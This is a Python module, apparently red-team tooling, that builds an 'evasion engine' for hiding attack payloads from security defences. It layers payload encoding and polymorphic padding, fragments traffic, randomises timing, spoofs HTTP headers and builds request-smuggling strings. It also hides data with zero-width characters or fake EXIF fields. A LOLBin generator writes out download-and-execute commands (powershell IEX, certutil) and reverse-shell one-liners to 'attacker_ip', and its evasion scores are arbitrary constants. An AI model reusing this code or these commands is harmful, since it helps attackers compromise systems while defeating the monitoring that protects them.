"""
Advanced Evasion Techniques Engine
Sophisticated red team capabilities and defense evasion methods
"""

import asyncio
import logging
import random
import string
import base64
import binascii
import urllib.parse
import json
import hashlib
import time
from typing import Dict, List, Optional, Any, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum
import re

logger = logging.getLogger(__name__)


class EvasionTechnique(Enum):
    """Types of evasion techniques"""
    ENCODING_OBFUSCATION = "encoding_obfuscation"
    TRAFFIC_FRAGMENTATION = "traffic_fragmentation"
    TIMING_MANIPULATION = "timing_manipulation"
    PROTOCOL_MANIPULATION = "protocol_manipulation"
    PAYLOAD_POLYMORPHISM = "payload_polymorphism"
    STEGANOGRAPHY = "steganography"
    LIVING_OFF_LAND = "living_off_land"
    PROCESS_HOLLOWING = "process_hollowing"
    DLL_HIJACKING = "dll_hijacking"
    MEMORY_INJECTION = "memory_injection"


class DetectionMethod(Enum):
    """Common detection methods to evade"""
    SIGNATURE_BASED = "signature_based"
    BEHAVIORAL_ANALYSIS = "behavioral_analysis"
    HEURISTIC_ANALYSIS = "heuristic_analysis"
    SANDBOXING = "sandboxing"
    NETWORK_MONITORING = "network_monitoring"
    ENDPOINT_DETECTION = "endpoint_detection"


@dataclass
class EvasionProfile:
    """Profile for evasion techniques"""
    technique: EvasionTechnique
    stealth_level: int  # 1-10, higher is more stealthy
    complexity: int     # 1-10, higher is more complex
    effectiveness: float  # 0.0-1.0, effectiveness against detection
    target_detections: List[DetectionMethod]
    parameters: Dict[str, Any] = field(default_factory=dict)


@dataclass
class EvasionResult:
    """Result of evasion technique application"""
    original_payload: bytes
    evaded_payload: bytes
    technique_used: EvasionTechnique
    detection_evasion_score: float
    metadata: Dict[str, Any] = field(default_factory=dict)


class PayloadObfuscator:
    """Advanced payload obfuscation techniques"""

    def __init__(self):
        self.encoding_techniques = [
            "base64", "hex", "url", "html", "unicode", "rot13", "custom"
        ]
        self.encryption_keys = {}

    async def multi_layer_encoding(self, payload: bytes, layers: int = 3) -> Tuple[bytes, List[str]]:
        """Apply multiple layers of encoding"""
        try:
            current_payload = payload
            applied_techniques = []

            for layer in range(layers):
                technique = random.choice(self.encoding_techniques)
                current_payload = await self._apply_encoding(current_payload, technique)
                applied_techniques.append(technique)

            return current_payload, applied_techniques

        except Exception as e:
            logger.error(f"Multi-layer encoding failed: {e}")
            raise

    async def _apply_encoding(self, data: bytes, technique: str) -> bytes:
        """Apply specific encoding technique"""
        try:
            if technique == "base64":
                return base64.b64encode(data)
            elif technique == "hex":
                return binascii.hexlify(data)
            elif technique == "url":
                return urllib.parse.quote(data.decode('latin-1')).encode('latin-1')
            elif technique == "html":
                return self._html_entity_encode(data)
            elif technique == "unicode":
                return self._unicode_encode(data)
            elif technique == "rot13":
                return self._rot13_encode(data)
            elif technique == "custom":
                return await self._custom_encode(data)
            else:
                return data

        except Exception as e:
            logger.debug(f"Encoding technique {technique} failed: {e}")
            return data

    def _html_entity_encode(self, data: bytes) -> bytes:
        """HTML entity encoding"""
        try:
            text = data.decode('utf-8', errors='ignore')
            encoded = ""
            for char in text:
                if ord(char) > 127 or char in '<>&"\'':
                    encoded += f"&#{ord(char)};"
                else:
                    encoded += char
            return encoded.encode('utf-8')
        except:
            return data

    def _unicode_encode(self, data: bytes) -> bytes:
        """Unicode escape encoding"""
        try:
            text = data.decode('utf-8', errors='ignore')
            encoded = ""
            for char in text:
                if ord(char) > 127:
                    encoded += f"\\u{ord(char):04x}"
                else:
                    encoded += char
            return encoded.encode('utf-8')
        except:
            return data

    def _rot13_encode(self, data: bytes) -> bytes:
        """ROT13 encoding"""
        try:
            text = data.decode('utf-8', errors='ignore')
            encoded = ""
            for char in text:
                if 'a' <= char <= 'z':
                    encoded += chr((ord(char) - ord('a') + 13) % 26 + ord('a'))
                elif 'A' <= char <= 'Z':
                    encoded += chr((ord(char) - ord('A') + 13) % 26 + ord('A'))
                else:
                    encoded += char
            return encoded.encode('utf-8')
        except:
            return data

    async def _custom_encode(self, data: bytes) -> bytes:
        """Custom XOR-based encoding"""
        try:
            key = random.randint(1, 255)
            self.encryption_keys[time.time()] = key
            return bytes(b ^ key for b in data)
        except:
            return data

    async def polymorphic_transformation(self, payload: bytes) -> bytes:
        """Create polymorphic version of payload"""
        try:
            # Add random padding
            padding_size = random.randint(10, 100)
            padding = ''.join(random.choices(string.ascii_letters + string.digits, k=padding_size))

            # Insert padding at random positions
            payload_str = payload.decode('utf-8', errors='ignore')
            positions = sorted(random.sample(range(len(payload_str)), min(5, len(payload_str)//10)))

            result = payload_str
            for i, pos in enumerate(reversed(positions)):
                comment_padding = f"/*{padding[i*10:(i+1)*10]}*/"
                result = result[:pos] + comment_padding + result[pos:]

            return result.encode('utf-8')

        except Exception as e:
            logger.debug(f"Polymorphic transformation failed: {e}")
            return payload


class TrafficFragmentator:
    """Network traffic fragmentation for evasion"""

    def __init__(self):
        self.fragment_sizes = [64, 128, 256, 512, 1024]
        self.delay_ranges = [(0.1, 0.5), (0.5, 1.0), (1.0, 2.0)]

    async def fragment_payload(self, payload: bytes, technique: str = "random") -> List[Tuple[bytes, float]]:
        """Fragment payload into smaller chunks with timing"""
        try:
            fragments = []

            if technique == "random":
                current_pos = 0
                while current_pos < len(payload):
                    fragment_size = random.choice(self.fragment_sizes)
                    fragment_size = min(fragment_size, len(payload) - current_pos)

                    fragment = payload[current_pos:current_pos + fragment_size]
                    delay_min, delay_max = random.choice(self.delay_ranges)
                    delay = random.uniform(delay_min, delay_max)

                    fragments.append((fragment, delay))
                    current_pos += fragment_size

            elif technique == "uniform":
                fragment_size = 128
                for i in range(0, len(payload), fragment_size):
                    fragment = payload[i:i + fragment_size]
                    delay = random.uniform(0.1, 0.3)
                    fragments.append((fragment, delay))

            elif technique == "exponential":
                current_pos = 0
                size = 32
                while current_pos < len(payload):
                    fragment_size = min(size, len(payload) - current_pos)
                    fragment = payload[current_pos:current_pos + fragment_size]
                    delay = random.uniform(0.1, 0.5)

                    fragments.append((fragment, delay))
                    current_pos += fragment_size
                    size = min(size * 2, 1024)

            return fragments

        except Exception as e:
            logger.error(f"Payload fragmentation failed: {e}")
            return [(payload, 0.0)]

    async def reassemble_fragments(self, fragments: List[Tuple[bytes, float]]) -> bytes:
        """Reassemble fragmented payload"""
        try:
            return b''.join(fragment for fragment, _ in fragments)
        except Exception as e:
            logger.error(f"Fragment reassembly failed: {e}")
            return b''


class TimingManipulator:
    """Sophisticated timing manipulation for evasion"""

    def __init__(self):
        self.timing_profiles = {
            "human": {"min_delay": 1.0, "max_delay": 5.0, "variance": 0.3},
            "automated": {"min_delay": 0.1, "max_delay": 0.5, "variance": 0.1},
            "slow_and_steady": {"min_delay": 10.0, "max_delay": 30.0, "variance": 0.2},
            "burst": {"min_delay": 0.01, "max_delay": 0.1, "variance": 0.8}
        }

    async def generate_timing_sequence(self, count: int, profile: str = "human") -> List[float]:
        """Generate timing sequence for operations"""
        try:
            if profile not in self.timing_profiles:
                profile = "human"

            config = self.timing_profiles[profile]
            base_delay = (config["min_delay"] + config["max_delay"]) / 2
            variance = config["variance"]

            timings = []
            for _ in range(count):
                # Apply variance
                variation = random.uniform(-variance, variance)
                delay = base_delay * (1 + variation)
                delay = max(config["min_delay"], min(config["max_delay"], delay))
                timings.append(delay)

            return timings

        except Exception as e:
            logger.error(f"Timing sequence generation failed: {e}")
            return [1.0] * count

    async def adaptive_timing(self, response_times: List[float]) -> float:
        """Calculate adaptive timing based on response times"""
        try:
            if not response_times:
                return 1.0

            avg_response = sum(response_times) / len(response_times)

            # Adapt to avoid detection patterns
            if avg_response < 0.1:  # Very fast responses
                return random.uniform(0.5, 2.0)  # Slow down
            elif avg_response > 5.0:  # Slow responses
                return random.uniform(0.1, 0.5)  # Speed up
            else:
                return random.uniform(0.5, 1.5)  # Normal variance

        except Exception as e:
            logger.debug(f"Adaptive timing calculation failed: {e}")
            return 1.0


class ProtocolManipulator:
    """Protocol-level manipulation techniques"""

    def __init__(self):
        self.http_methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

    async def manipulate_http_headers(self, headers: Dict[str, str]) -> Dict[str, str]:
        """Manipulate HTTP headers for evasion"""
        try:
            manipulated = headers.copy()

            # Randomize User-Agent
            manipulated["User-Agent"] = random.choice(self.user_agents)

            # Add legitimate-looking headers
            manipulated["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            manipulated["Accept-Language"] = "en-US,en;q=0.5"
            manipulated["Accept-Encoding"] = "gzip, deflate"
            manipulated["DNT"] = "1"
            manipulated["Connection"] = "keep-alive"
            manipulated["Upgrade-Insecure-Requests"] = "1"

            # Add cache control to appear normal
            manipulated["Cache-Control"] = "max-age=0"

            # Randomize header order
            items = list(manipulated.items())
            random.shuffle(items)

            return dict(items)

        except Exception as e:
            logger.error(f"HTTP header manipulation failed: {e}")
            return headers

    async def http_method_tunneling(self, original_method: str, payload: bytes) -> Tuple[str, Dict[str, str], bytes]:
        """Tunnel HTTP method through headers"""
        try:
            # Use POST with method override
            new_method = "POST"
            headers = {
                "X-HTTP-Method-Override": original_method,
                "X-Method-Override": original_method,
                "Content-Type": "application/x-www-form-urlencoded"
            }

            # Encode payload if necessary
            if original_method in ["GET", "HEAD"]:
                # Convert to form data
                form_data = f"_method={original_method}&data={base64.b64encode(payload).decode()}"
                payload = form_data.encode()

            return new_method, headers, payload

        except Exception as e:
            logger.error(f"HTTP method tunneling failed: {e}")
            return original_method, {}, payload

    async def protocol_smuggling(self, request_data: bytes) -> bytes:
        """HTTP request smuggling techniques"""
        try:
            # Simple CL.TE smuggling attempt
            smuggled_request = b"POST /admin HTTP/1.1\r\n"
            smuggled_request += b"Host: internal.server\r\n"
            smuggled_request += b"Content-Length: 0\r\n"
            smuggled_request += b"\r\n"

            # Combine with original request
            combined = request_data + b"\r\n" + smuggled_request

            # Add conflicting headers
            if b"Content-Length:" in combined:
                # Add Transfer-Encoding
                combined = combined.replace(
                    b"\r\n\r\n",
                    b"\r\nTransfer-Encoding: chunked\r\n\r\n"
                )

            return combined

        except Exception as e:
            logger.error(f"Protocol smuggling failed: {e}")
            return request_data


class SteganographyEngine:
    """Steganography techniques for payload hiding"""

    def __init__(self):
        self.image_formats = ["PNG", "JPEG", "BMP"]
        self.text_carriers = ["Lorem ipsum", "JSON data", "XML content"]

    async def hide_in_image_metadata(self, payload: bytes, image_data: bytes) -> bytes:
        """Hide payload in image metadata (simulated)"""
        try:
            # Simulate hiding payload in EXIF data
            marker = b"\xff\xe1"  # EXIF marker for JPEG

            # Create fake EXIF block with hidden payload
            exif_header = b"Exif\x00\x00"
            payload_encoded = base64.b64encode(payload)

            # Disguise as camera model
            fake_exif = b"Camera Model: " + payload_encoded + b"\x00"
            exif_length = len(exif_header + fake_exif)

            exif_block = marker + exif_length.to_bytes(2, 'big') + exif_header + fake_exif

            # Insert after SOI marker in JPEG
            if image_data.startswith(b"\xff\xd8"):
                return image_data[:2] + exif_block + image_data[2:]
            else:
                return image_data + exif_block

        except Exception as e:
            logger.error(f"Image steganography failed: {e}")
            return image_data

    async def hide_in_text(self, payload: bytes, cover_text: str) -> str:
        """Hide payload in text using various techniques"""
        try:
            payload_bits = ''.join(format(byte, '08b') for byte in payload)

            # Use zero-width characters
            hidden_text = ""
            bit_index = 0

            for char in cover_text:
                hidden_text += char

                # Insert zero-width characters based on payload bits
                if bit_index < len(payload_bits):
                    if payload_bits[bit_index] == '1':
                        hidden_text += '\u200b'  # Zero-width space
                    else:
                        hidden_text += '\u200c'  # Zero-width non-joiner
                    bit_index += 1

            return hidden_text

        except Exception as e:
            logger.error(f"Text steganography failed: {e}")
            return cover_text

    async def extract_from_text(self, stego_text: str) -> bytes:
        """Extract hidden payload from text"""
        try:
            # Extract zero-width characters
            bits = ""
            for char in stego_text:
                if char == '\u200b':  # Zero-width space
                    bits += '1'
                elif char == '\u200c':  # Zero-width non-joiner
                    bits += '0'

            # Convert bits to bytes
            if len(bits) % 8 == 0:
                payload = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))
                return payload
            else:
                return b""

        except Exception as e:
            logger.error(f"Text payload extraction failed: {e}")
            return b""


class LivingOffLandTechniques:
    """Living off the land binary (LOLBin) techniques"""

    def __init__(self):
        self.windows_lolbins = {
            "powershell": {
                "executable": "powershell.exe",
                "techniques": ["script_execution", "download", "persistence"],
                "common_args": ["-ExecutionPolicy Bypass", "-WindowStyle Hidden"]
            },
            "wmic": {
                "executable": "wmic.exe",
                "techniques": ["process_execution", "info_gathering"],
                "common_args": ["process", "call", "create"]
            },
            "certutil": {
                "executable": "certutil.exe",
                "techniques": ["download", "encoding"],
                "common_args": ["-urlcache", "-split", "-f"]
            },
            "bitsadmin": {
                "executable": "bitsadmin.exe",
                "techniques": ["download", "persistence"],
                "common_args": ["/transfer", "/download"]
            }
        }

        self.linux_lolbins = {
            "curl": {
                "executable": "curl",
                "techniques": ["download", "exfiltration"],
                "common_args": ["-s", "-o", "-X"]
            },
            "wget": {
                "executable": "wget",
                "techniques": ["download"],
                "common_args": ["-q", "-O", "--post-data"]
            },
            "nc": {
                "executable": "nc",
                "techniques": ["reverse_shell", "exfiltration"],
                "common_args": ["-e", "-l", "-p"]
            }
        }

    async def generate_lolbin_command(self, technique: str, platform: str = "windows") -> str:
        """Generate living off the land command"""
        try:
            lolbins = self.windows_lolbins if platform == "windows" else self.linux_lolbins

            # Find suitable LOLBin for technique
            suitable_bins = [
                name for name, info in lolbins.items()
                if technique in info["techniques"]
            ]

            if not suitable_bins:
                return ""

            chosen_bin = random.choice(suitable_bins)
            bin_info = lolbins[chosen_bin]

            # Generate command based on technique
            if technique == "download":
                if chosen_bin == "powershell":
                    return f"powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload')\""
                elif chosen_bin == "certutil":
                    return f"certutil.exe -urlcache -split -f http://example.com/payload payload.exe"
                elif chosen_bin == "curl":
                    return f"curl -s -o payload http://example.com/payload"

            elif technique == "script_execution":
                if chosen_bin == "powershell":
                    return f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {{encoded_script}}\""

            elif technique == "reverse_shell":
                if chosen_bin == "nc":
                    return f"nc -e /bin/bash attacker_ip 4444"
                elif chosen_bin == "powershell":
                    return f"powershell.exe -Command \"$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444)\""

            return f"{bin_info['executable']} {' '.join(bin_info['common_args'])}"

        except Exception as e:
            logger.error(f"LOLBin command generation failed: {e}")
            return ""


class AdvancedEvasionEngine:
    """Main advanced evasion engine"""

    def __init__(self):
        self.obfuscator = PayloadObfuscator()
        self.fragmentator = TrafficFragmentator()
        self.timing_manipulator = TimingManipulator()
        self.protocol_manipulator = ProtocolManipulator()
        self.steganography = SteganographyEngine()
        self.lolbin_techniques = LivingOffLandTechniques()

        self.evasion_profiles = self._initialize_profiles()

    def _initialize_profiles(self) -> Dict[str, EvasionProfile]:
        """Initialize evasion profiles"""
        return {
            "stealth_max": EvasionProfile(
                technique=EvasionTechnique.PAYLOAD_POLYMORPHISM,
                stealth_level=10,
                complexity=9,
                effectiveness=0.95,
                target_detections=[DetectionMethod.SIGNATURE_BASED, DetectionMethod.BEHAVIORAL_ANALYSIS]
            ),
            "speed_optimized": EvasionProfile(
                technique=EvasionTechnique.ENCODING_OBFUSCATION,
                stealth_level=6,
                complexity=4,
                effectiveness=0.75,
                target_detections=[DetectionMethod.SIGNATURE_BASED]
            ),
            "advanced_apt": EvasionProfile(
                technique=EvasionTechnique.LIVING_OFF_LAND,
                stealth_level=9,
                complexity=8,
                effectiveness=0.90,
                target_detections=[DetectionMethod.ENDPOINT_DETECTION, DetectionMethod.BEHAVIORAL_ANALYSIS]
            )
        }

    async def apply_evasion_techniques(self, payload: bytes, profile_name: str = "stealth_max") -> EvasionResult:
        """Apply comprehensive evasion techniques"""
        try:
            if profile_name not in self.evasion_profiles:
                profile_name = "stealth_max"

            profile = self.evasion_profiles[profile_name]
            logger.info(f"Applying evasion profile: {profile_name}")

            current_payload = payload
            applied_techniques = []

            # Apply primary technique
            if profile.technique == EvasionTechnique.PAYLOAD_POLYMORPHISM:
                current_payload = await self.obfuscator.polymorphic_transformation(current_payload)
                applied_techniques.append("polymorphic_transformation")

            elif profile.technique == EvasionTechnique.ENCODING_OBFUSCATION:
                current_payload, encoding_layers = await self.obfuscator.multi_layer_encoding(current_payload, 3)
                applied_techniques.extend(encoding_layers)

            elif profile.technique == EvasionTechnique.STEGANOGRAPHY:
                # Create carrier text
                carrier_text = "This is a normal looking text file with hidden content."
                stego_text = await self.steganography.hide_in_text(current_payload, carrier_text)
                current_payload = stego_text.encode()
                applied_techniques.append("text_steganography")

            # Apply secondary techniques based on stealth level
            if profile.stealth_level >= 8:
                # Add traffic fragmentation
                fragments = await self.fragmentator.fragment_payload(current_payload, "random")
                current_payload = await self.fragmentator.reassemble_fragments(fragments)
                applied_techniques.append("traffic_fragmentation")

            if profile.stealth_level >= 7:
                # Add timing manipulation metadata
                timing_sequence = await self.timing_manipulator.generate_timing_sequence(5, "human")
                applied_techniques.append(f"timing_manipulation_{len(timing_sequence)}_steps")

            # Calculate evasion score
            detection_evasion_score = await self._calculate_evasion_score(
                payload, current_payload, applied_techniques, profile
            )

            return EvasionResult(
                original_payload=payload,
                evaded_payload=current_payload,
                technique_used=profile.technique,
                detection_evasion_score=detection_evasion_score,
                metadata={
                    "profile": profile_name,
                    "applied_techniques": applied_techniques,
                    "stealth_level": profile.stealth_level,
                    "complexity": profile.complexity
                }
            )

        except Exception as e:
            logger.error(f"Evasion technique application failed: {e}")
            return EvasionResult(
                original_payload=payload,
                evaded_payload=payload,
                technique_used=EvasionTechnique.ENCODING_OBFUSCATION,
                detection_evasion_score=0.0,
                metadata={"error": str(e)}
            )

    async def _calculate_evasion_score(self, original: bytes, evaded: bytes,
                                     techniques: List[str], profile: EvasionProfile) -> float:
        """Calculate evasion effectiveness score"""
        try:
            base_score = profile.effectiveness

            # Bonus for multiple techniques
            technique_bonus = min(len(techniques) * 0.05, 0.2)

            # Bonus for payload transformation
            if len(evaded) != len(original):
                transformation_bonus = 0.1
            else:
                transformation_bonus = 0.05

            # Penalty for overly complex transformations that might trigger heuristics
            if len(evaded) > len(original) * 3:
                complexity_penalty = -0.15
            else:
                complexity_penalty = 0.0

            final_score = base_score + technique_bonus + transformation_bonus + complexity_penalty
            return max(0.0, min(1.0, final_score))

        except Exception as e:
            logger.error(f"Evasion score calculation failed: {e}")
            return 0.5

    async def generate_evasion_report(self, results: List[EvasionResult]) -> Dict[str, Any]:
        """Generate comprehensive evasion report"""
        try:
            if not results:
                return {"error": "No evasion results provided"}

            avg_score = sum(r.detection_evasion_score for r in results) / len(results)

            techniques_used = {}
            for result in results:
                for technique in result.metadata.get("applied_techniques", []):
                    techniques_used[technique] = techniques_used.get(technique, 0) + 1

            return {
                "summary": {
                    "total_payloads_processed": len(results),
                    "average_evasion_score": avg_score,
                    "highest_evasion_score": max(r.detection_evasion_score for r in results),
                    "lowest_evasion_score": min(r.detection_evasion_score for r in results)
                },
                "techniques_analysis": {
                    "most_used_technique": max(techniques_used.items(), key=lambda x: x[1])[0] if techniques_used else None,
                    "technique_distribution": techniques_used,
                    "unique_techniques": len(set(techniques_used.keys()))
                },
                "recommendations": await self._generate_evasion_recommendations(results),
                "detailed_results": [
                    {
                        "technique": r.technique_used.value,
                        "evasion_score": r.detection_evasion_score,
                        "payload_size_change": len(r.evaded_payload) - len(r.original_payload),
                        "applied_techniques": r.metadata.get("applied_techniques", [])
                    }
                    for r in results
                ]
            }

        except Exception as e:
            logger.error(f"Evasion report generation failed: {e}")
            return {"error": str(e)}

    async def _generate_evasion_recommendations(self, results: List[EvasionResult]) -> List[str]:
        """Generate recommendations based on evasion results"""
        recommendations = []

        avg_score = sum(r.detection_evasion_score for r in results) / len(results)

        if avg_score < 0.7:
            recommendations.append("Consider using more sophisticated evasion techniques")
            recommendations.append("Increase stealth level in evasion profiles")

        if any(len(r.evaded_payload) > len(r.original_payload) * 2 for r in results):
            recommendations.append("Optimize payload size to avoid suspicious transformations")

        recommendations.extend([
            "Regularly update evasion techniques to counter new detection methods",
            "Test evasion effectiveness against multiple detection systems",
            "Implement adaptive evasion based on target environment",
            "Consider combining multiple evasion techniques for maximum effectiveness"
        ])

        return recommendations


# Global instance
_evasion_engine: Optional[AdvancedEvasionEngine] = None

async def get_evasion_engine() -> AdvancedEvasionEngine:
    """Get global advanced evasion engine instance"""
    global _evasion_engine

    if _evasion_engine is None:
        _evasion_engine = AdvancedEvasionEngine()

    return _evasion_engine
